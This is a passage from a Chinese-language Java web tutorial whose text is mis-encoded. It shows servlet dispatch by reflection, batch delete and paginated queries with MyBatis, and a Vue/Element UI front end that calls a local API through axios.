class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;            e.printStackTrace();        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>é€šè¿‡ä¸Šé¢ä»£ç å‘ç°æ ¹æ®æ–¹æ³•åè·å–å¯¹åº”æ–¹æ³•çš„ <code>Method</code> å¯¹è±¡æ—¶éœ€è¦æŒ‡å®šæ–¹æ³•å‚æ•°çš„å­—èŠ‚ç å¯¹è±¡ã€‚è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å°†æ–¹æ³•çš„å‚æ•°ç±»å‹è§„å®šæ­»ï¼Œè€Œæ–¹æ³•ä¸­å¯èƒ½éœ€è¦ç”¨åˆ° <code>request</code> å¯¹è±¡å’Œ <code>response</code> å¯¹è±¡ï¼Œæ‰€ä»¥æŒ‡å®šæ–¹æ³•çš„å‚æ•°ä¸º <code>HttpServletRequest</code> å’Œ <code>HttpServletResponse</code>ï¼Œé‚£ä¹ˆ <code>BrandServlet</code> ä»£ç å°±å¯ä»¥æ”¹è¿›ä¸ºï¼š</p><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseServlet</span> </span>&#123;    <span class="hljs-comment">//ç”¨æˆ·å®ç°åˆ†é¡µæŸ¥è¯¢</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;        <span class="hljs-comment">//æ·»åŠ ä¼ä¸šä¿¡æ¯</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;        <span class="hljs-comment">//ä¿®æ”¹ä¼ä¸šä¿¡æ¯</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;        <span class="hljs-comment">//åˆ é™¤ä¼ä¸šä¿¡æ¯</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;&#125;</code></pre><p>BaseServletä»£ç å¯ä»¥æ”¹è¿›ä¸ºï¼š</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-comment">//æ ¹æ®è¯·æ±‚çš„æœ€åä¸€æ®µè·¯å¾„æ¥è¿›è¡Œæ–¹æ³•åˆ†å‘</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        <span class="hljs-comment">//1. è·å–è¯·æ±‚è·¯å¾„</span>        String uri = req.getRequestURI(); <span class="hljs-comment">// ä¾‹å¦‚è·¯å¾„ä¸ºï¼š/brand-case/brand/selectAll</span>        <span class="hljs-comment">//2. è·å–æœ€åä¸€æ®µè·¯å¾„ï¼Œæ–¹æ³•å</span>        <span class="hljs-keyword">int</span> index = uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);        String methodName = uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  è·å–åˆ°èµ„æºçš„äºŒçº§è·¯å¾„  selectAll   </span>        <span class="hljs-comment">//2. æ‰§è¡Œæ–¹æ³•</span>        <span class="hljs-comment">//2.1 è·å–BrandServlet /UserServlet å­—èŠ‚ç å¯¹è±¡ Class</span>        <span class="hljs-comment">//System.out.println(this);</span>        Class&lt;? extends BaseServlet&gt; cls = <span class="hljs-keyword">this</span>.getClass();        <span class="hljs-comment">//2.2 è·å–æ–¹æ³• Methodå¯¹è±¡</span>        <span class="hljs-keyword">try</span> &#123;               Method method = cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class);            <span class="hljs-comment">//2.3 æ‰§è¡Œæ–¹æ³•</span>            method.invoke(<span class="hljs-keyword">this</span>,req,resp);        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;            e.printStackTrace();        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;            e.printStackTrace();        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>å‰ç«¯éœ€è¦æ”¹åªæœ‰å‡ ä¸ªè®¿é—®è·¯å¾„ï¼Œè¿™é‡Œä¸åšå…·ä½“å®ç°</p><h3 id="3-æ‰¹é‡åˆ é™¤"><a href="#3-æ‰¹é‡åˆ é™¤" class="headerlink" title="3.æ‰¹é‡åˆ é™¤"></a>3.æ‰¹é‡åˆ é™¤</h3><h4 id="éœ€æ±‚åˆ†æ-2"><a href="#éœ€æ±‚åˆ†æ-2" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h4><ul><li>æ‰¹é‡åˆ é™¤è¯·æ±‚ï¼Œæºå¸¦å‚æ•°ä¸º<code>[1,2,3...]</code>ç±»å‹çš„jsonå­—ç¬¦ä¸²</li><li>åç«¯æ¥æ”¶åˆ°jsonå­—ç¬¦ä¸²åéœ€è¦å°†å…¶è½¬ä¸ºintæ•°ç»„</li><li>è°ƒç”¨BrandServiceä¸­çš„æ–¹æ³•åˆ é™¤æ•°æ®</li></ul><h4 id="åç«¯å®ç°-2"><a href="#åç«¯å®ç°-2" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-2"><a href="#dao-2" class="headerlink" title="dao"></a>dao</h5><p><code>BrandMapper</code>ä¸­æ·»åŠ <code>deleteByIds()</code>æ–¹æ³•</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ‰¹é‡åˆ é™¤</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;ids&quot;)</span> <span class="hljs-keyword">int</span>[] ids)</span></span>;</code></pre><h5 id="service-2"><a href="#service-2" class="headerlink" title="service"></a>service</h5><p>åœ¨<code>BrandService</code>ä¸­å®ç°æ‰¹é‡åˆ é™¤çš„ä¸šåŠ¡é€»è¾‘ä»£ç </p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ‰¹é‡åˆ é™¤</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] ids)</span></span>&#123;    SqlSession sqlSession = sqlSessionFactory.openSession();    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);    mapper.deleteByIds(ids);    sqlSession.commit();    sqlSession.close();&#125;</code></pre><h5 id="servlet-2"><a href="#servlet-2" class="headerlink" title="servlet"></a>servlet</h5><p><code>src/main/java/com/itheima/web/servlet</code>çš„<code>BrandServlet</code>æ·»åŠ <code>deleteByIds</code>æ–¹æ³•</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ‰¹é‡åˆ é™¤æ“ä½œ</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;    BufferedReader reader = request.getReader();    <span class="hljs-comment">// è·å–jsonå­—ç¬¦ä¸²</span>    String line = reader.readLine();    System.out.println(line);    <span class="hljs-keyword">int</span>[] ids = JSON.parseObject(line, <span class="hljs-keyword">int</span>[].class);    System.out.println(ids);    service.deleteByIds(ids);    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);&#125;</code></pre><h4 id="å‰ç«¯å®ç°-2"><a href="#å‰ç«¯å®ç°-2" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><h5 id="è·å–é€‰ä¸­æ•°æ®çš„idå€¼"><a href="#è·å–é€‰ä¸­æ•°æ®çš„idå€¼" class="headerlink" title="è·å–é€‰ä¸­æ•°æ®çš„idå€¼"></a>è·å–é€‰ä¸­æ•°æ®çš„idå€¼</h5><p><code>handleSelectionChange</code></p><pre><code class="hljs html">&lt;el-table                :data=&quot;brandlist&quot;                style=&quot;width: 100%&quot;                :row-class-name=&quot;tableRowClassName&quot;                @selection-change=&quot;handleSelectionChange&quot;        &gt;</code></pre><p>å¯ä»¥çœ‹åˆ°å½“æ•°æ®è¢«é€‰ä¸­åï¼Œ<code>multipleSelection</code>ä¼šå­˜æ”¾è¢«é€‰æ‹©çš„æ•°æ®å¯¹è±¡</p><pre><code class="hljs js"><span class="hljs-comment">// å¤é€‰æ¡†é€‰ä¸­åæ‰§è¡Œçš„æ–¹æ³•</span>            <span class="hljs-function"><span class="hljs-title">handleSelectionChange</span>(<span class="hljs-params">val</span>)</span> &#123;                <span class="hljs-built_in">this</span>.multipleSelection = val;                <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.multipleSelection)                <span class="hljs-comment">// console.log(this.multipleSelection)</span>            &#125;,</code></pre><p>è€Œæˆ‘ä»¬æ‰€éœ€è¦çš„åªæ˜¯å¯¹è±¡çš„idå€¼ï¼Œå› æ­¤éœ€è¦éå†<code>multipleSelection</code>è·å–idå€¼</p><pre><code class="hljs js"><span class="hljs-comment">// ä»_this.multipleSelectionè·å–brandçš„idå€¼</span>                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.multipleSelection.length;i++)&#123;                        <span class="hljs-keyword">let</span> selectItem = _this.multipleSelection[i];                        _this.selectedIds[i] = selectItem.id;                    &#125;</code></pre><h5 id="æ‰¹é‡åˆ é™¤æç¤º"><a href="#æ‰¹é‡åˆ é™¤æç¤º" class="headerlink" title="æ‰¹é‡åˆ é™¤æç¤º"></a>æ‰¹é‡åˆ é™¤æç¤º</h5><p>åˆ é™¤æ“ä½œä¸€èˆ¬æ¯”è¾ƒå±é™©å› æ­¤éœ€è¦è®©ç”¨æˆ·ç¡®è®¤æ˜¯å¦åˆ é™¤ï¼Œåœ¨element-uiä¸­æ‰¾åˆ°<code>$confirm</code>ç»„ä»¶å®ç°è¯¥åŠŸèƒ½</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">deleteByIds</span>(<span class="hljs-params"></span>)</span>&#123;              <span class="hljs-built_in">this</span>.$confirm(<span class="hljs-string">&#x27;ç¡®å®šåˆ é™¤å—ï¼Ÿ&#x27;</span>, <span class="hljs-string">&#x27;ç¡®è®¤ä¿¡æ¯&#x27;</span>, &#123;                  distinguishCancelAndClose: <span class="hljs-literal">true</span>,                  confirmButtonText: <span class="hljs-string">&#x27;ç¡®å®š&#x27;</span>,                  cancelButtonText: <span class="hljs-string">&#x27;å–æ¶ˆ&#x27;</span>              &#125;).then(<span class="hljs-function">() =&gt;</span> &#123;                  <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;                  <span class="hljs-comment">// ä»_this.multipleSelectionè·å–brandçš„idå€¼</span>                  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.multipleSelection.length;i++)&#123;                      <span class="hljs-keyword">let</span> selectItem = _this.multipleSelection[i];                      _this.selectedIds[i] = selectItem.id;                  &#125;                  axios(&#123;                      method: <span class="hljs-string">&#x27;post&#x27;</span>,                      url:<span class="hljs-string">&quot;http://localhost:8080/brand-case/brand/deleteByIds&quot;</span>,                      data: _this.selectedIds                  &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;                      <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;                          <span class="hljs-comment">// é‡æ–°æŸ¥è¯¢æ•°æ®</span>                          _this.selectAll();                          <span class="hljs-comment">//æ˜¾ç¤ºæç¤ºæ¡†</span>                          _this.$message(&#123;                              type: <span class="hljs-string">&#x27;success&#x27;</span>,                              message: <span class="hljs-string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span>                          &#125;);                      &#125;                  &#125;)                  &#125;).catch(<span class="hljs-function">() =&gt;</span> &#123;                      <span class="hljs-built_in">this</span>.$message(&#123;                          type: <span class="hljs-string">&#x27;info&#x27;</span>,                          message: <span class="hljs-string">&quot;å–æ¶ˆåˆ é™¤&quot;</span>                      &#125;)              &#125;);          &#125;</code></pre><h3 id="4-åˆ†é¡µæŸ¥è¯¢"><a href="#4-åˆ†é¡µæŸ¥è¯¢" class="headerlink" title="4.åˆ†é¡µæŸ¥è¯¢"></a>4.åˆ†é¡µæŸ¥è¯¢</h3><h4 id="éœ€æ±‚åˆ†æ-3"><a href="#éœ€æ±‚åˆ†æ-3" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h4><h5 id="åˆ†é¡µæŸ¥è¯¢sql"><a href="#åˆ†é¡µæŸ¥è¯¢sql" class="headerlink" title="åˆ†é¡µæŸ¥è¯¢sql"></a>åˆ†é¡µæŸ¥è¯¢sql</h5><p>åˆ†é¡µæŸ¥è¯¢ä¹Ÿæ˜¯ä»æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ†é¡µå¯¹åº”çš„SQLè¯­å¥åº”è¯¥æ€ä¹ˆå†™ã€‚åˆ†é¡µæŸ¥è¯¢ä½¿ç”¨ <code>LIMIT</code> å…³é”®å­—ï¼Œæ ¼å¼ä¸ºï¼š==<code>LIMIT å¼€å§‹ç´¢å¼• æ¯é¡µæ˜¾ç¤ºçš„æ¡æ•°</code>==ã€‚ä»¥åå‰ç«¯é¡µé¢åœ¨å‘é€è¯·æ±‚æºå¸¦å‚æ•°æ—¶ï¼Œå®ƒå¹¶ä¸æ˜ç¡®å¼€å§‹ç´¢å¼•æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯å®ƒçŸ¥é“æŸ¥è¯¢ç¬¬å‡ é¡µã€‚æ‰€ä»¥ <code>å¼€å§‹ç´¢å¼•</code> éœ€è¦åœ¨åç«¯è¿›è¡Œè®¡ç®—ï¼Œè®¡ç®—çš„å…¬å¼æ˜¯ ï¼š==å¼€å§‹ç´¢å¼• = ï¼ˆå½“å‰é¡µç  -  1ï¼‰*  æ¯é¡µæ˜¾ç¤ºæ¡æ•°==</p><p>æ¯”å¦‚æŸ¥è¯¢ç¬¬ä¸€é¡µçš„æ•°æ®çš„ SQL è¯­å¥æ˜¯ï¼š</p><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">5</span>;</code></pre><p>æŸ¥è¯¢ç¬¬äºŒé¡µçš„æ•°æ®çš„ SQL è¯­å¥æ˜¯ï¼š</p><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">5</span>;</code></pre><p>æŸ¥è¯¢ç¬¬ä¸‰é¡µçš„æ•°æ®çš„ SQL è¯­å¥æ˜¯ï¼š</p><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">10</span>,<span class="hljs-number">5</span>;</code></pre><h5 id="å‰åç«¯æ•°æ®åˆ†æ"><a href="#å‰åç«¯æ•°æ®åˆ†æ" class="headerlink" title="å‰åç«¯æ•°æ®åˆ†æ"></a>å‰åç«¯æ•°æ®åˆ†æ</h5><p>åˆ†é¡µæŸ¥è¯¢åŠŸèƒ½æ—¶å€™æ¯”è¾ƒå¤æ‚çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆåˆ†ææ¸…æ¥šä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li><p><strong>å‰ç«¯éœ€è¦ä¼ é€’ä»€ä¹ˆå‚æ•°ç»™åç«¯</strong></p><p>æ ¹æ®ä¸Šä¸€æ­¥å¯¹åˆ†é¡µæŸ¥è¯¢ SQL è¯­å¥åˆ†æå¾—å‡ºï¼Œå‰ç«¯éœ€è¦ç»™åç«¯ä¸¤ä¸ªå‚æ•°</p><ul><li>å½“å‰é¡µç  ï¼š currentPage</li><li>æ¯é¡µæ˜¾ç¤ºæ¡æ•°ï¼špageSize</li></ul></li><li><p><strong>åç«¯éœ€è¦å“åº”ä»€ä¹ˆæ•°æ®ç»™å‰ç«¯</strong></p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826231842293.png" alt="image-20210826231842293" style="zoom:80%;"><p>ä¸Šå›¾æ˜¯åˆ†é¡µæŸ¥è¯¢é¡µé¢å±•ç¤ºçš„æ•ˆæœï¼Œä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹å‡ºéœ€è¦å“åº”ä»¥ä¸‹è”è‚¡ä»½æ•°æ®</p><ul><li>å½“å‰é¡µéœ€è¦å±•ç¤ºçš„æ•°æ®ã€‚æˆ‘ä»¬åœ¨åç«¯ä¸€èˆ¬ä¼šå­˜å‚¨åˆ° List é›†åˆä¸­</li><li>æ€»å…±è®°å½•æ•°ã€‚åœ¨ä¸Šå›¾é¡µé¢ä¸­éœ€è¦å±•ç¤ºæ€»çš„è®°å½•æ•°ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†æ•°æ®ä¹Ÿéœ€è¦ã€‚æ€»çš„é¡µé¢ elementUI çš„åˆ†é¡µç»„ä»¶ä¼šè‡ªåŠ¨è®¡ç®—ï¼Œæˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒ</li></ul><p>è€Œè¿™ä¸¤éƒ¨åˆ†éœ€è¦å°è£…åˆ° PageBean å¯¹è±¡ä¸­ï¼Œå¹¶å°†è¯¥å¯¹è±¡è½¬æ¢ä¸º json æ ¼å¼çš„æ•°æ®å“åº”å›ç»™æµè§ˆå™¨</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826232158234.png" alt="image-20210826232158234" style="zoom:65%;"></li></ul><p>é€šè¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬éœ€è¦å…ˆåœ¨ <code>pojo</code> åŒ…ä¸‹åˆ›å»º <code>PageBean</code> ç±»ï¼Œä¸ºäº†åšåˆ°é€šè¿‡ä¼šå°†å…¶å®šä¹‰æˆæ³›å‹ç±»ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code class="hljs java"><span class="hljs-comment">//åˆ†é¡µæŸ¥è¯¢çš„JavaBean</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PageBean</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;    <span class="hljs-comment">// æ€»è®°å½•æ•°</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> totalCount;    <span class="hljs-comment">// å½“å‰é¡µæ•°æ®</span>    <span class="hljs-keyword">private</span> List&lt;T&gt; rows;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getTotalCount</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> totalCount;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTotalCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> totalCount)</span> </span>&#123;        <span class="hljs-keyword">this</span>.totalCount = totalCount;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;T&gt; <span class="hljs-title">getRows</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> rows;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setRows</span><span class="hljs-params">(List&lt;T&gt; rows)</span> </span>&#123;        <span class="hljs-keyword">this</span>.rows = rows;    &#125;&#125;</code></pre><h4 id="åç«¯å®ç°-3"><a href="#åç«¯å®ç°-3" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-3"><a href="#dao-3" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * åˆ†é¡µæŸ¥è¯¢</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-meta">@Select(&quot;select * from tb_brand limit #&#123;begin&#125;, #&#123;size&#125;&quot;)</span><span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span><span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectByPage</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-keyword">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-keyword">int</span> size)</span></span>;<span class="hljs-comment">/**</span><span class="hljs-comment"> * æŸ¥è¯¢æ€»è®°å½•æ•°</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-meta">@Select(&quot;select count(*) from tb_brand&quot;)</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">selectTotalCount</span><span class="hljs-params">()</span></span>;</code></pre><h5 id="service-3"><a href="#service-3" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span><span class="hljs-comment">   * åˆ†é¡µæŸ¥è¯¢</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span><span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">   */</span>  <span class="hljs-function"><span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title">selectByPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;      SqlSession sqlSession = sqlSessionFactory.openSession();      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);      <span class="hljs-comment">// æ ¹æ®å…¬å¼è®¡ç®—èµ·å§‹å€¼</span>      <span class="hljs-keyword">int</span> begin = (currentPage - <span class="hljs-number">1</span>) * pageSize;      <span class="hljs-keyword">int</span> size = pageSize;      <span class="hljs-comment">// è·å–è¯¥é¡µæ•°æ®</span>      List&lt;Brand&gt; rows = mapper.selectByPage(begin, size);<span class="hljs-comment">// è·å–æ€»è®°å½•æ•°</span>      <span class="hljs-keyword">int</span> totalCount = mapper.selectTotalCount();<span class="hljs-comment">// åˆ›å»ºPageBeanå¯¹è±¡</span>      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> PageBean&lt;&gt;();      pageBean.setRows(rows);      pageBean.setTotalCount(totalCount);      sqlSession.close();      <span class="hljs-keyword">return</span> pageBean;  &#125;</code></pre><h5 id="servlet-3"><a href="#servlet-3" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span><span class="hljs-comment">   * åˆ†é¡µæŸ¥è¯¢</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> request</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> response</span><span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> ServletException</span><span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment">   */</span>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectByPage</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;      request.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);      <span class="hljs-comment">// 1.è·å–å½“å‰é¡µç å’Œæ¯é¡µå±•ç¤ºæ¡æ•° url?currentpage=1&amp;pagesize=5</span>      String _currentpage = request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);      String _pagesize = request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);      <span class="hljs-keyword">int</span> currentpage = Integer.parseInt(_currentpage);      <span class="hljs-keyword">int</span> pagesize = Integer.parseInt(_pagesize);      <span class="hljs-comment">// 2.è½¬ä¸ºjson</span>      PageBean&lt;Brand&gt; pageBean = service.selectByPage(currentpage, pagesize);      String string = JSON.toJSONString(pageBean);<span class="hljs-comment">// å“åº”æ•°æ®</span>      response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);      response.getWriter().write(string);  &#125;</code></pre><h4 id="å‰ç«¯å®ç°-3"><a href="#å‰ç«¯å®ç°-3" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><h5 id="åˆ†é¡µå·¥å…·æ¡"><a href="#åˆ†é¡µå·¥å…·æ¡" class="headerlink" title="åˆ†é¡µå·¥å…·æ¡"></a>åˆ†é¡µå·¥å…·æ¡</h5><p>æ”¾åœ¨è¡¨å•ä¸‹é¢</p><pre><code class="hljs html"><span class="hljs-comment">&lt;!--åˆ†é¡µå·¥å…·æ¡--&gt;</span>&lt;el-pagination        @size-change=&quot;handleSizeChange&quot;   <span class="hljs-comment">&lt;!--è®¾ç½®æ¯é¡µæ˜¾ç¤ºæ¡æ•°--&gt;</span>        @current-change=&quot;handleCurrentChange&quot;  <span class="hljs-comment">&lt;!--ä¿®æ”¹å½“å‰é¡µç --&gt;</span>        :current-page=&quot;currentPage&quot;         <span class="hljs-comment">&lt;!--ç»‘å®šcurrentPageæ¨¡å‹--&gt;</span>        :page-sizes=&quot;[5, 10, 15, 20]&quot;        :page-size=&quot;5&quot;        layout=&quot;total, sizes, prev, pager, next, jumper&quot;        :total=&quot;totalCount&quot;&gt;<span class="hljs-comment">&lt;!--ç»‘å®štotalCountæ¨¡å‹--&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-pagination</span>&gt;</span></code></pre><p>ä¿®æ”¹<code>handleSizeChange</code>å’Œ<code>handleCurrentChange</code></p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">handleSizeChange</span>(<span class="hljs-params">val</span>)</span> &#123;    <span class="hljs-comment">// console.log(`æ¯é¡µ $&#123;val&#125; æ¡`);</span>    <span class="hljs-comment">// è®¾ç½®æ¯é¡µæ˜¾ç¤ºæ¡æ•°</span>    <span class="hljs-built_in">this</span>.pageSize = val;    <span class="hljs-comment">// é‡æ–°æŸ¥è¯¢</span>    <span class="hljs-built_in">this</span>.selectAll();    <span class="hljs-comment">// this.currentPage=1</span>&#125;,<span class="hljs-function"><span class="hljs-title">handleCurrentChange</span>(<span class="hljs-params">val</span>)</span> &#123;    <span class="hljs-built_in">this</span>.currentPage = val;&#125;,</code></pre><h5 id="ä¿®æ”¹selectAll-å¼‚æ­¥è¯·æ±‚æ–¹æ³•"><a href="#ä¿®æ”¹selectAll-å¼‚æ­¥è¯·æ±‚æ–¹æ³•" class="headerlink" title="ä¿®æ”¹selectAll()å¼‚æ­¥è¯·æ±‚æ–¹æ³•"></a>ä¿®æ”¹selectAll()å¼‚æ­¥è¯·æ±‚æ–¹æ³•</h5><p>ä¸»è¦ä¿®æ”¹urlå’Œè·å–å“åº”æ•°æ®åçš„å¤„ç†æ–¹å¼</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">selectAll</span>(<span class="hljs-params"></span>)</span>&#123;                <span class="hljs-comment">// var _this = this;</span>                <span class="hljs-comment">// axios(&#123;</span>                <span class="hljs-comment">//     method: &#x27;GET&#x27;,</span>                <span class="hljs-comment">//     url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>                <span class="hljs-comment">// &#125;).then(function(response)&#123;</span>                <span class="hljs-comment">//     var brandlist = response.data;</span>                <span class="hljs-comment">//     _this.brandlist = brandlist;</span>                <span class="hljs-comment">// &#125;)</span>                <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;                axios(&#123;                    method: <span class="hljs-string">&#x27;GET&#x27;</span>,                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectByPage?currentpage=&#x27;</span>+ _this.currentPage + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.pageSize                &#125;).then(<span 